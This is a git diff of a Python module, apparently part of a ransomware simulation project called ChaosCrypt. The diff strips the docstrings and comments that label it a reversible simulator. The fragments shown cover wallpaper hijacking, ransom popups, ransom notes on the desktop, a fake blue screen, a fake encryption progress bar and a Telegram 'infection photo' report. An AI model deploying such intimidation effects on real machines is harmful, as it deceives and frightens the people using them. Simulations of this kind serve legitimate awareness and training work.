@@ -1,29 +1,3 @@
-"""
-ChaosCrypt Chaos Effects — Visual Effects Panel
-=================================================
-  1.  Wallpaper Hijack      — зміна шпалер на infected_wall.jpg
-  2.  Wallpaper Restore     — відновлення оригінальних шпалер
-  3.  Cursor Chaos          — ховає/дрижить курсор
-  4.  QR Popup              — вікно з QR-кодом ключа
-  5.  Ransom Popup          — вікно вимагач�� з таймером
-  6.  Console Terror        — ASCII-арт + кольори консолі
-  7.  Desktop Flood         — записки вимагача на робочий стіл
-  8.  Desktop Cleanup       — прибирання записок
-  9.  Fake BSOD             — повноекранний "синій екран смерті"
-  10. Matrix Rain           — "Matrix" символи в консолі
-  11. Window Shaker         — трясе вікна (Tkinter)
-  12. Fake Progress Bar     — "Encrypting files..." прогрес-бар
-  13. Glitch Text           — глітч-текст у консолі
-  14. Screen Flash          — блимання екрану
-  15. Audio Beep            — системний біп
-  16. Infection Photo TG    — шле фото зараження в TG
-  17. Full Pipeline         — всі ефекти послідовно
-  18. Full Cleanup          — повне відновлення
-
-LogBook phase: "chaos"
-SAFE_MODE: всі ефекти reversible
-"""
-
 import os
 import sys
 import time
@@ -130,7 +104,6 @@ BSOD_TEXT = """
 
 
 class ChaosEffects:
-    """Visual ransomware effects simulator."""
 
     def __init__(self):
         self.logger = LogBook(phase=CHAOS_PHASE)
@@ -143,9 +116,6 @@ class ChaosEffects:
             "is_windows": self.is_windows, "session": self.session_id
         })
 
-    # ═══════════════════════════════════════════════
-    # 1. WALLPAPER HIJACK
-    # ═══════════════════════════════════════════════
     def _get_current_wallpaper(self):
         if not self.is_windows:
             return None
@@ -214,9 +184,6 @@ class ChaosEffects:
         self.logger.log_event("remediation", "Wallpaper restored")
         return ok
 
-    # ═══════════════════════════════════════════════
-    # 2. CURSOR CHAOS
-    # ═══════════════════════════════════════════════
     def cursor_chaos(self, duration=4):
         print(f"[CHAOS] ─── Cursor Chaos ({duration}s) ───")
         if not self.is_windows:
@@ -236,9 +203,6 @@ class ChaosEffects:
             except Exception:
                 pass
 
-    # ═══════════════════════════════════════════════
-    # 3. QR POPUP
-    # ═══════════════════════════════════════════════
     def qr_popup(self, key_text=None, duration=8):
         print("[CHAOS] ─── QR Popup ───")
         qr_path = os.path.join(LOG_DIR, RANSOM_QR_NAME)
@@ -293,9 +257,6 @@ class ChaosEffects:
         except Exception as e:
             print(f"[CHAOS] QR popup error: {e}")
 
-    # ═══════════════════════════════════════════════
-    # 4. RANSOM POPUP
-    # ═══════════════════════════════════════════════
     def ransom_popup(self, duration=10):
         print("[CHAOS] ─── Ransom Popup ───")
         try:
@@ -365,9 +326,6 @@ class ChaosEffects:
         except Exception as e:
             print(f"[CHAOS] Ransom popup error: {e}")
 
-    # ═══════════════════════════════════════════════
-    # 5. CONSOLE TERROR
-    # ═══════════════════════════════════════════════
     def console_terror(self):
         print("[CHAOS] ─── Console Terror ───")
         if self.is_windows:
@@ -380,9 +338,6 @@ class ChaosEffects:
             try: os.system("color 07")
             except: pass
 
-    # ═══════════════════════════════════════════════
-    # 6. DESKTOP FLOOD
-    # ═══════════════════════════════════════════════
     def desktop_flood(self, count=5):
         print(f"[CHAOS] ─── Desktop Flood ({count} notes) ───")
         if not os.path.exists(DESKTOP_PATH):
@@ -433,9 +388,6 @@ class ChaosEffects:
         print(f"[CHAOS] ✅ Cleaned {removed} files from Desktop.")
         self.logger.log_event("remediation", f"Desktop cleaned: {removed} files")
 
-    # ═══════════════════════════════════════════════
-    # 7. FAKE BSOD
-    # ═══════════════════════════════════════════════
     def fake_bsod(self, duration=8):
         print("[CHAOS] ─── Fake BSOD ───")
         try:
@@ -472,9 +424,6 @@ class ChaosEffects:
         except Exception as e:
             print(f"[CHAOS] BSOD error: {e}")
 
-    # ═══════════════════════════════════════════════
-    # 8. MATRIX RAIN
-    # ═══════════════════════════════════════════════
     def matrix_rain(self, duration=5, width=80):
         print("[CHAOS] ─── Matrix Rain ───")
         self.logger.log_event("chaos", "Matrix rain effect", metadata={"duration": duration})
@@ -495,9 +444,6 @@ class ChaosEffects:
             except: pass
         print("[CHAOS] Matrix rain done.")
 
-    # ═══════════════════════════════════════════════
-    # 9. FAKE PROGRESS BAR
-    # ═══════════════════════════════════════════════
     def fake_encrypt_progress(self, total_files=47, duration=6):
         print("[CHAOS] ─── Fake Encryption Progress ───")
         self.logger.log_event("chaos", "Fake encrypt progress", metadata={"files": total_files})
@@ -537,9 +483,6 @@ class ChaosEffects:
             try: os.system("color 07")
             except: pass
 
-    # ═══════════════════════════════════════════════
-    # 10. GLITCH TEXT
-    # ═══════════════════════════════════════════════
     def glitch_text(self, text="YOUR FILES ARE ENCRYPTED", iterations=15):
         print("[CHAOS] ─── Glitch Text ───")
         self.logger.log_event("chaos", "Glitch text effect")
@@ -557,9 +500,6 @@ class ChaosEffects:
         sys.stdout.write(f"\r  💀 {text}                    \n")
         sys.stdout.flush()
 
-    # ═══════════════════════════════════════════════
-    # 11. SCREEN FLASH
-    # ═══════════════════════════════════════════════
     def screen_flash(self, flashes=5, duration=0.15):
         print(f"[CHAOS] ─── Screen Flash ({flashes}x) ───")
         try:
@@ -588,9 +528,6 @@ class ChaosEffects:
         except Exception as e:
             print(f"[CHAOS] Flash error: {e}")
 
-    # ═══════════════════════════════════════════════
-    # 12. WINDOW SHAKER
-    # ═══════════════════════════════════════════════
     def window_shaker(self, duration=3, intensity=15):
         print(f"[CHAOS] ─── Window Shaker ({duration}s) ───")
         try:
@@ -626,9 +563,6 @@ class ChaosEffects:
         except Exception as e:
             print(f"[CHAOS] Shaker error: {e}")
 
-    # ═══════════════════════════════════════════════
-    # 13. AUDIO BEEP
-    # ═══════════════════════════════════════════════
     def audio_beep(self, count=3):
         print(f"[CHAOS] ─── Audio Beep ({count}x) ───")
         self.logger.log_event("chaos", "Audio beep", metadata={"count": count})
@@ -644,9 +578,6 @@ class ChaosEffects:
                 print('\a', end='')
             time.sleep(0.4)
 
-    # ═══════════════════════════════════════════════
-    # 14. SKULL PARADE
-    # ═══════════════════════════════════════════════
     def skull_parade(self, count=3):
         print("[CHAOS] ─── Skull Parade ───")
         self.logger.log_event("chaos", "Skull parade")
@@ -661,9 +592,6 @@ class ChaosEffects:
             try: os.system("color 07")
             except: pass
 
-    # ═══════════════════════════════════════════════
-    # 15. FAKE FILE LISTING
-    # ═══════════════════════════════════════════════
     def fake_file_listing(self, count=20):
         print("[CHAOS] ─── Fake File Scanner ───")
         self.logger.log_event("chaos", "Fake file listing")
@@ -681,9 +609,6 @@ class ChaosEffects:
             time.sleep(0.1)
         print(f"\n  📊 SCAN COMPLETE: {count} files targeted.\n")
 
-    # ═══════════════════════════════════════════════
-    # 16. TG INFECTION PHOTO
-    # ═══════════════════════════════════════════════
     def send_infection_photo(self):
         logo = os.path.join(ASSETS_DIR, IMG_LOGO_SYSTEM)
         if send_photo and os.path.exists(logo):
@@ -692,9 +617,6 @@ class ChaosEffects:
                                "<code>Wallpaper | Desktop | Popups | BSOD</code>",
                        parse_mode="HTML", async_mode=False)
 
-    # ═══════════════════════════════════════════════
-    # 17. FULL PIPELINE
-    # ═══════════════════════════════════════════════
     def run_full_effects(self):
         print("\n" + "=" * 60)
         print("*** ChaosCrypt Chaos Effects — Full Pipeline ***")
